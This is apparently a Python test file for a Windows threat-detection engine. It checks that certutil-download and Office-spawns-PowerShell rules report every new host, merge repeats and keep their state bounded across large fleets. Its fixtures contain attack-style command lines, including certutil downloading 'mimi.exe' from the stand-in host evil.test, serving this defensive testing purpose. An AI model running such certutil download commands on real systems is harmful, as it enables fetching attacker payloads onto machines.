"""Mission-scale fleet behaviour: new hosts are never hidden, repeats merge, state stays bounded."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

from romulus.detect.windows_proxy import CertutilDownloadDecode
from romulus.evidence.normalize import normalize_hits
from romulus.evidence.windows import normalize_windows
from romulus.evidence.windows_catalog import SYSMON, SYSMON_CHANNEL
from tests.windows_fixtures import LogicalWindowsEvent, mission_windows_volume, windows_hit

_START = datetime(2026, 1, 2, 4, 0, 0, tzinfo=UTC)


def _certutil(host: str, ordinal: int, url: str = "http://payload.test/a"):
    data = {
        "UtcTime": (_START + timedelta(milliseconds=ordinal)).strftime("%Y-%m-%d %H:%M:%S.000"),
        "ProcessGuid": f"{{00000000-0000-0000-0000-{ordinal:012x}}}", "ProcessId": "1000", "ParentProcessId": "700",
        "Image": r"C:\Windows\System32\certutil.exe",
        "CommandLine": f"certutil.exe -urlcache -split -f {url} {url}",
    }
    event = LogicalWindowsEvent(SYSMON_CHANNEL, SYSMON, 1, host, 200_000 + ordinal,
                                (_START + timedelta(milliseconds=ordinal)).isoformat().replace("+00:00", "Z"), data)
    return normalize_windows(windows_hit(event, "elastic_agent"))


def _run(rule, events):
    by_id = {e.id: e for e in events}
    rule.load = lambda ids: [by_id[i] for i in ids if i in by_id]
    immediate = list(rule.consume(events))
    rule.drain_staged()
    rule.drain_bounds()
    final = rule.finalize()
    return immediate, final


def test_every_new_host_is_reported_immediately_whatever_the_fleet_size():
    rule = CertutilDownloadDecode()
    # 2,000 hosts, one benign-looking certutil each, identical command → one shape, 2,000 distinct hosts
    events = [_certutil(f"ws{n:04d}.example.test", n) for n in range(2_000)]
    immediate, final = _run(rule, events)
    # every host's first record is published immediately; none is hidden behind a cap
    assert len(immediate) == 2_000
    assert all(m.claim_type == "observed_action" for m in immediate)
    # no repeats on any host, so no merged fleet finding exists
    assert final == []
    # state is bounded: one group, one membership row per host — not one row per record beyond that
    assert len(rule.groups) == 1
    assert len(rule.members_store) == 2_000


def test_a_new_host_with_a_different_payload_is_its_own_finding_amid_benign_repeats():
    rule = CertutilDownloadDecode()
    events = []
    # a benign shape repeated many times on one host (SCCM-style), then one attacker record with a different URL
    for n in range(50):
        events.append(_certutil("sccm01.example.test", n, url="http://wsus.internal/patch.cab"))
    attacker = _certutil("dc01.example.test", 9_999, url="http://evil.test/mimi.exe")
    events.append(attacker)
    immediate, final = _run(rule, events)
    claims = " ".join(m.claim for m in immediate)
    # the attacker's own record is immediate, with its own URL, on its own host (host keyed by short computer name)
    assert "evil.test/mimi.exe" in claims and "dc01" in claims
    # the benign host's first record is also immediate; its 49 repeats merge into exactly one fleet finding
    assert sum(m.claim_type == "observed_action" for m in immediate) == 2        # one per distinct host
    fleet = [m for m in final if m.claim_type == "aggregate_observation"]
    assert len(fleet) == 1
    assert "sccm01" in fleet[0].claim and "wsus.internal" in fleet[0].claim
    # the attacker's distinct payload is never folded into the benign group
    assert "evil.test" not in fleet[0].claim


def test_repeats_on_one_host_become_one_finding_with_counts_and_bounds():
    rule = CertutilDownloadDecode()
    events = [_certutil("ws01.example.test", n, url="http://evil.test/a") for n in range(10_000)]
    immediate, final = _run(rule, events)
    assert len(immediate) >= 1                       # the first record (and the fleet finding once repeats start)
    fleet = [m for m in final if m.claim_type == "aggregate_observation"]
    assert len(fleet) == 1
    assert "10,000 process-creation record(s)" in fleet[0].claim or "10000" in fleet[0].claim.replace(",", "")
    assert "cited" in fleet[0].claim                 # first and last are cited
    assert len(rule.members_store) == 1              # one (shape, host) row, not 10,000


def test_mission_volume_streams_in_batches_without_unbounded_growth():
    rule = CertutilDownloadDecode()
    rule.load = lambda ids: []
    seen = 0
    batch: list = []
    for hit in mission_windows_volume(60_000, shape="elastic_agent"):
        events, _skips, _errors = normalize_hits([hit])
        batch.extend(events)
        if len(batch) >= 5_000:
            assert rule.consume(batch) == []         # the factory volume never matches certutil-download
            rule.drain_staged()
            rule.drain_bounds()
            seen += len(batch)
            batch = []
    if batch:
        assert rule.consume(batch) == []
        seen += len(batch)
    assert seen >= 60_000
    assert rule.finalize() == []
    assert len(rule.groups) == 0 and len(rule.members_store) == 0


def test_withdrawn_members_at_volume_leave_an_exact_tally_and_bounded_citations():
    # 200 hosts, each with one Word process and 20 identical PowerShell children; a termination of Word read later
    # falls between the 10th and 11th child on every host, withdrawing the parent of 10 children per host.
    from romulus.detect.windows_common import WITHDRAWN_CITED
    from romulus.detect.windows_lineage import LureAppSpawnsCodeRunner
    from tests.windows_process_support import security4688, security4689

    word = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    first, late = [], []
    for index in range(200):
        host = f"ws{index:04d}.example.test"
        first.append(security4688(image=word, command="winword.exe", host=host, pid=0x700, ppid=0x10, offset=0))
        first += [security4688(image=ps, command="powershell.exe -nop", host=host, pid=0x1000 + 4 * child,
                               ppid=0x700, offset=10 + child) for child in range(20)]
        late.append(security4689(image=word, host=host, pid=0x700, offset=19.5))
    rule = LureAppSpawnsCodeRunner()
    by_id = {e.id: e for e in first + late}
    rule.load = lambda ids: [by_id[i] for i in ids if i in by_id]
    immediate = list(rule.consume(first))
    rule.drain_staged()
    rule.drain_bounds()
    immediate += rule.consume(late)
    rule.drain_staged()
    final = rule.finalize()
    assert len([m for m in immediate if not m.group_key]) == 200          # every host's first record, at once
    [tally] = [m for m in final if "|fleet|" in m.group_key]
    assert tally.proposed_lane == "high"
    assert "in 2000 process-creation record(s) across 200 host(s) (1800 of them repeats" in tally.claim
    assert "2000 record(s) were excluded after later records withdrew their parent" in tally.claim
    [group] = [rule.groups.peek(key) for key in rule.order.keys()]  # noqa: SIM118 (a KeyedStore)
    assert len(group.withdrawn) <= WITHDRAWN_CITED and len(group.withdrawn_bounds) <= 2
    assert len(tally.events) <= 8 + WITHDRAWN_CITED + 2
    assert rule.undecided == {"parent_ended": 2000}
